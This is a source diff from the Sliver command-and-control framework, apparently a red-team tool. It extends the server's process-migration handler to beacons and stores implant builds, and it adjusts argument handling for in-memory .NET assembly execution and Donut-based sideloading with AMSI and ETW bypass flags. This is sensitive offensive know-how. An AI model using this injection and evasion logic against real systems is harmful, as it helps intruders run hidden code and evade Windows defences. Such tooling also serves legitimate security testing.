@@ -26,6 +26,7 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
+	"time"
 
 	"github.com/Binject/debug/pe"
 	"github.com/bishopfox/sliver/protobuf/clientpb"
@@ -42,7 +43,6 @@ import (
 
 	"google.golang.org/grpc/codes"
 	"google.golang.org/grpc/status"
-	"google.golang.org/protobuf/proto"
 )
 
 var (
@@ -62,10 +62,28 @@ func (rpc *Server) Task(ctx context.Context, req *sliverpb.TaskReq) (*sliverpb.T
 // Migrate - Migrate to a new process on the remote system (Windows only)
 func (rpc *Server) Migrate(ctx context.Context, req *clientpb.MigrateReq) (*sliverpb.Migrate, error) {
 	var shellcode []byte
-	session := core.Sessions.Get(req.Request.SessionID)
-	if session == nil {
-		return nil, ErrInvalidSessionID
+	var session *core.Session
+	var beacon *clientpb.Beacon
+	var dbBeacon *models.Beacon
+	var err error
+
+	if !req.Request.Async { // is this a session?
+		session = core.Sessions.Get(req.Request.SessionID)
+		if session == nil {
+			return nil, ErrInvalidSessionID
+		}
+	} else { // then it must be a beacon
+		dbBeacon, err = db.BeaconByID(req.Request.BeaconID)
+		if err != nil {
+			tasksLog.Errorf("%s", err)
+			return nil, ErrDatabaseFailure
+		}
+		beacon = dbBeacon.ToProtobuf()
+		if beacon == nil {
+			return nil, ErrInvalidBeaconID
+		}
 	}
+
 	name := filepath.Base(req.Name)
 	shellcode, arch, err := getSliverShellcode(name)
 	if err != nil {
@@ -81,6 +99,10 @@ func (rpc *Server) Migrate(ctx context.Context, req *clientpb.MigrateReq) (*sliv
 			name = req.Name
 		}
 		config.Format = clientpb.OutputFormat_SHELLCODE
+		// Tweak some of the config parameters
+		config.IsShellcode = true
+		config.IsSharedLib = false
+		config.TemplateName = "sliver"
 		config.ObfuscateSymbols = true
 		build, err := generate.GenerateConfig(name, config)
 		if err != nil {
@@ -98,6 +120,24 @@ func (rpc *Server) Migrate(ctx context.Context, req *clientpb.MigrateReq) (*sliv
 			return nil, err
 		}
 		shellcode, _ = os.ReadFile(shellcodePath)
+		// Save the implant config in the database so that the server recognizes it when it tries to connect
+		config.ID = ""
+		savedConfig, err := db.SaveImplantConfig(config)
+		if err != nil {
+			return nil, err
+		}
+		build.ImplantConfigID = savedConfig.ID
+
+		/* Save the build in the database so that the server recognizes it when it tries to connect
+		   This build will have the same name as the implant it is being spawned from, so
+		   we need to create a unique name for the database
+		*/
+		build.Name = fmt.Sprintf("%s_%d", build.Name, time.Now().Unix())
+		_, err = db.SaveImplantBuild(build)
+		if err != nil {
+			return nil, err
+		}
+
 	}
 
 	if len(shellcode) < 1 {
@@ -114,24 +154,20 @@ func (rpc *Server) Migrate(ctx context.Context, req *clientpb.MigrateReq) (*sliv
 
 	}
 
-	reqData, err := proto.Marshal(&sliverpb.InvokeMigrateReq{
-		Request: req.Request,
-		Data:    shellcode,
-		Pid:     req.Pid,
-	})
+	migrateReq := &sliverpb.InvokeMigrateReq{
+		Request:  req.Request,
+		Data:     shellcode,
+		Pid:      req.Pid,
+		ProcName: req.ProcName,
+	}
+
+	resp := &sliverpb.Migrate{Response: &commonpb.Response{}}
+	err = rpc.GenericHandler(migrateReq, resp)
+
 	if err != nil {
 		return nil, err
 	}
-	timeout := rpc.getTimeout(req)
-	respData, err := session.Request(sliverpb.MsgInvokeMigrateReq, timeout, reqData)
-	if err != nil {
-		return nil, err
-	}
-	resp := &sliverpb.Migrate{}
-	err = proto.Unmarshal(respData, resp)
-	if err != nil {
-		return nil, err
-	}
+
 	return resp, nil
 }
 
@@ -162,7 +198,7 @@ func (rpc *Server) ExecuteAssembly(ctx context.Context, req *sliverpb.ExecuteAss
 		req.Assembly,
 		req.IsDLL,
 		req.Arch,
-		req.Arguments,
+		strings.Join(req.Arguments, " "),
 		req.Method,
 		req.ClassName,
 		req.AppDomain,
@@ -178,7 +214,7 @@ func (rpc *Server) ExecuteAssembly(ctx context.Context, req *sliverpb.ExecuteAss
 		invokeInProcExecAssembly := &sliverpb.InvokeInProcExecuteAssemblyReq{
 			Data:       req.Assembly,
 			Runtime:    req.Runtime,
-			Arguments:  strings.Split(req.Arguments, " "),
+			Arguments:  req.Arguments,
 			AmsiBypass: req.AmsiBypass,
 			EtwBypass:  req.EtwBypass,
 			Request:    req.Request,
@@ -230,7 +266,7 @@ func (rpc *Server) Sideload(ctx context.Context, req *sliverpb.SideloadReq) (*sl
 	}
 
 	if getOS(session, beacon) == "windows" {
-		shellcode, err := generate.DonutShellcodeFromPE(req.Data, arch, false, req.Args, "", req.EntryPoint, req.IsDLL, req.IsUnicode, false)
+		shellcode, err := generate.DonutShellcodeFromPE(req.Data, arch, false, strings.Join(req.Args, " "), "", req.EntryPoint, req.IsDLL, req.IsUnicode, false)
 		if err != nil {
 			tasksLog.Errorf("Sideload failed: %s", err)
 			return nil, err
